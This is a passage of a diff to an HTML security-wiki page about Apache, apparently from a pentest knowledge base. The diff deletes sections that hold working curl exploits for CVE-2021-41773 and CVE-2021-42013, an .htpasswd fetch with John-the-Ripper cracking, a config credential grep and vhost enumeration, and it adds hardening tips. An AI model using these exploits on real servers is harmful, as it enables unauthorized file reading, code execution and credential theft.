+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>apache2ctl<span class="w"> </span>configtest
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>apachectl<span class="w"> </span>-t
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="c1"># Display virtual hosts</span>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>apache2ctl<span class="w"> </span>-S
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>httpd<span class="w"> </span>-S
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="c1"># Display compiled modules</span>
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>apache2ctl<span class="w"> </span>-M
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>
+</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="c1"># Find all .htaccess files</span>
+</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>find<span class="w"> </span>/var/www/<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;.htaccess&quot;</span>
 </span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>
-</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a><span class="c1"># Search for credentials</span>
-</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">&quot;password&quot;</span><span class="w"> </span>/etc/apache2/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
-</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">&quot;Auth&quot;</span><span class="w"> </span>/etc/apache2/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
-</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>
-</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a><span class="c1"># Read logs in real-time</span>
-</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>tail<span class="w"> </span>-f<span class="w"> </span>/var/log/apache2/access.log
-</span><span id="__span-6-25"><a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a>tail<span class="w"> </span>-f<span class="w"> </span>/var/log/apache2/error.log
+</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a><span class="c1"># Read real-time access logs</span>
+</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>tail<span class="w"> </span>-f<span class="w"> </span>/var/log/apache2/access.log
 </span></code></pre></div>
-<hr />
-<h2 id="known-vulnerabilities">Known Vulnerabilities<a class="headerlink" href="#known-vulnerabilities" title="Permanent link">&para;</a></h2>
-<details class="danger">
-<summary>CVE-2021-41773 - Path Traversal</summary>
-<p>Critical vulnerability allowing arbitrary file reading.</p>
-<p><strong>Affected versions:</strong> Apache 2.4.49<br />
-<strong>Exploit:</strong>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>curl<span class="w"> </span>http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-</span></code></pre></div></p>
-</details>
-<details class="danger">
-<summary>CVE-2021-42013 - RCE via Path Traversal</summary>
-<p>Bypass of CVE-2021-41773 patch allowing code execution.</p>
-<p><strong>Affected versions:</strong> Apache 2.4.49, 2.4.50<br />
-<strong>Exploit:</strong>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>curl<span class="w"> </span><span class="s1">&#39;http://target/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#39;</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;echo Content-Type: text/plain; echo; id&#39;</span>
-</span></code></pre></div></p>
-</details>
 <hr />
 <h2 id="hardening">Hardening<a class="headerlink" href="#hardening" title="Permanent link">&para;</a></h2>
 <div class="admonition success">
 <p class="admonition-title">Best practices</p>
 <ul>
-<li>Disable server signature: <code>ServerTokens Prod</code> and <code>ServerSignature Off</code></li>
-<li>Restrict access to sensitive directories via <code>.htaccess</code></li>
-<li>Use HTTPS with valid certificates (Let's Encrypt)</li>
-<li>Disable unused modules: <code>a2dismod [module]</code></li>
-<li>Limit request size: <code>LimitRequestBody</code></li>
-<li>Enable ModSecurity (WAF)</li>
-<li>Keep Apache regularly updated</li>
+<li>Disable directory listing (<code>Options -Indexes</code>).</li>
+<li>Hide server version by setting <code>ServerTokens Prod</code> and <code>ServerSignature Off</code>.</li>
+<li>Disable unnecessary modules to reduce the attack surface.</li>
+<li>Restrict access to <code>/server-status</code>.</li>
+<li>Run Apache as a non-privileged user (e.g., <code>www-data</code>).</li>
 </ul>
 </div>
-<hr />
-<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
-<ul>
-<li><a href="https://httpd.apache.org/docs/">Apache HTTP Server Documentation</a></li>
-<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Apache_Configuration_Cheat_Sheet.html">OWASP Web Server Configuration</a></li>
-<li><a href="https://httpd.apache.org/security/vulnerabilities_24.html">Apache CVE List</a></li>
-<li><a href="https://hackerone.com/apache">HackerOne Apache Reports</a></li>
-</ul>
-<hr />
-<h2 id="exploitation-examples">Exploitation Examples<a class="headerlink" href="#exploitation-examples" title="Permanent link">&para;</a></h2>
-<details class="example">
-<summary>Reading .htpasswd</summary>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># If directory is misconfigured</span>
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>curl<span class="w"> </span>http://target/.htpasswd
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="c1"># Hash found</span>
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>admin:<span class="nv">$apr1$ABC123$xyz</span>...
-</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>
-</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="c1"># Crack with John</span>
-</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>htpasswd.txt
-</span></code></pre></div>
-</details>
-<details class="example">
-<summary>VirtualHost Enumeration</summary>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># Via Host header</span>
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="k">for</span><span class="w"> </span>vhost<span class="w"> </span><span class="k">in</span><span class="w"> </span>www<span class="w"> </span>admin<span class="w"> </span>api<span class="w"> </span>dev<span class="w"> </span>staging<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">    </span>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: </span><span class="nv">$vhost</span><span class="s2">.target.com&quot;</span><span class="w"> </span>http://target-ip/
-</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="k">done</span>
-</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>
-</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="c1"># Via gobuster</span>
-</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>gobuster<span class="w"> </span>vhost<span class="w"> </span>-u<span class="w"> </span>http://target.com<span class="w"> </span>-w<span class="w"> </span>vhosts.txt
-</span></code></pre></div>
-</details>
 <hr />
 <h2 id="metadata">Metadata<a class="headerlink" href="#metadata" title="Permanent link">&para;</a></h2>
 <ul>
 <li><strong>Template version:</strong> 1.0</li>
-<li><strong>Last updated:</strong> November 2024</li>
-<li><strong>Contributor:</strong> EpiHack Benin</li>
+<li><strong>Last updated:</strong> 2026-04</li>
+<li><strong>Contributor:</strong> AI Assistant</li>
 <li><strong>Sources verified:</strong> Yes</li>
 </ul>
 
